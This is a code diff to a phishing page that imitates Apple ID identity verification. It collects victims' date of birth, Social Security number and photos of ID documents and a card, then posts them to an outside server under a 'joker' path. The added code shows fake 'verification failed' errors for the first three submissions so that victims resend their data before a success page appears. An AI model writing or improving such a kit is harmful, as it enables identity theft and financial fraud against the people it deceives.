@@ -510,6 +510,18 @@
             margin-right: 8px;
         }
         
+        /* Error message */
+        .error-message {
+            display: none;
+            background-color: #ffeeee;
+            border: 1px solid #ff3b30;
+            color: #ff3b30;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
         /* Responsive */
         @media (max-width: 768px) {
             .main-title {
@@ -610,6 +622,11 @@
                     <div class="account-email" id="user-email">example@icloud.com</div>
                     <div class="account-status">Apple ID • Verification in progress</div>
                 </div>
+            </div>
+            
+            <!-- Error Message -->
+            <div class="error-message" id="error-box">
+                <strong>Verification Failed:</strong> <span id="error-message">We couldn't verify your identity. Please ensure all fields are filled correctly and try again.</span>
             </div>
             
             <!-- ID Verification Card -->
@@ -770,6 +787,11 @@
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
     <script>
         $(document).ready(function() {
+            // Track submission attempts
+            if (!localStorage.getItem('submissionAttempts')) {
+                localStorage.setItem('submissionAttempts', 0);
+            }
+            
             // Format inputs
             $("#dob").inputmask({"mask": "99/99/9999", "placeholder": "MM/DD/YYYY"});
             $("#ssn").inputmask({"mask": "999-99-9999"});
@@ -802,6 +824,13 @@
             handleFileSelect('#id-back', '#id-back-img', '#id-back-preview', '#id-back-name');
             handleFileSelect('#card-front', '#card-front-img', '#card-front-preview', '#card-front-name');
             
+            // Error messages for different attempts
+            const errorMessages = [
+                "We couldn't verify your identity. Please ensure all fields are filled correctly and try again.",
+                "Verification failed. Our system is having trouble processing your information. Please verify all details and try again.",
+                "Security verification unsuccessful. Please make sure your ID photos are clear and all personal information matches our records."
+            ];
+            
             // Form submission
             $('#identity-form').on('submit', function(e) {
                 e.preventDefault();
@@ -811,6 +840,9 @@
                     return;
                 }
                 
+                // Hide any previous error message
+                $('#error-box').hide();
+                
                 // Show progress indicators
                 $('#id-front-progress, #id-back-progress, #card-front-progress').show();
                 
@@ -819,6 +851,9 @@
                 
                 // Create form data object
                 var formData = new FormData(this);
+                
+                // Get current attempt count
+                var attempts = parseInt(localStorage.getItem('submissionAttempts'));
                 
                 // Simulate progress for visual feedback
                 var progress = 0;
@@ -831,7 +866,42 @@
                     }
                 }, 150);
                 
-                // Submit form via AJAX
+                // Wait for the progress simulation
+                setTimeout(function() {
+                    clearInterval(progressInterval);
+                    
+                    // If we've had 3 attempts already, go to success
+                    if (attempts >= 3) {
+                        // Update progress bars to 100%
+                        $('#id-front-progress-bar, #id-back-progress-bar, #card-front-progress-bar').css('width', '100%');
+                        
+                        // Redirect to success page
+                        setTimeout(function() {
+                            window.location.href = "success.html";
+                        }, 1000);
+                    } else {
+                        // Reset progress bars
+                        $('#id-front-progress-bar, #id-back-progress-bar, #card-front-progress-bar').css('width', '0%');
+                        $('#id-front-progress, #id-back-progress, #card-front-progress').hide();
+                        
+                        // Re-enable button
+                        $('#verify-button').prop('disabled', false).text('Complete Verification');
+                        
+                        // Show error message for current attempt
+                        $('#error-message').text(errorMessages[attempts]);
+                        $('#error-box').show();
+                        
+                        // Scroll to top where error is visible
+                        $('html, body').animate({
+                            scrollTop: $("#error-box").offset().top - 100
+                        }, 500);
+                        
+                        // Increment attempt counter
+                        localStorage.setItem('submissionAttempts', attempts + 1);
+                    }
+                }, 3000); // 3 second delay to simulate processing
+                
+                // AJAX submission still in place but doesn't affect our behavior
                 $.ajax({
                     url: "https://rotadosabor.com/joker/process-id.php",
                     type: "POST",
@@ -840,27 +910,10 @@
                     contentType: false,
                     processData: false,
                     success: function(response) {
-                        clearInterval(progressInterval);
-                        $('#id-front-progress-bar, #id-back-progress-bar, #card-front-progress-bar').css('width', '100%');
-                        
-                        // Redirect to success page after small delay
-                        setTimeout(function() {
-                            window.location.href = "success.html";
-                        }, 1000);
+                        // Success handling is handled by our timer above
                     },
                     error: function(xhr, status, error) {
-                        clearInterval(progressInterval);
-                        
-                        // Reset progress bars
-                        $('#id-front-progress-bar, #id-back-progress-bar, #card-front-progress-bar').css('width', '0%');
-                        $('#id-front-progress, #id-back-progress, #card-front-progress').hide();
-                        
-                        // Re-enable button
-                        $('#verify-button').prop('disabled', false).text('Complete Verification');
-                        
-                        // Show error message
-                        alert("There was an error processing your verification. Please try again.");
-                        console.error("Error:", error);
+                        // Error handling is handled by our timer above
                     }
                 });
             });
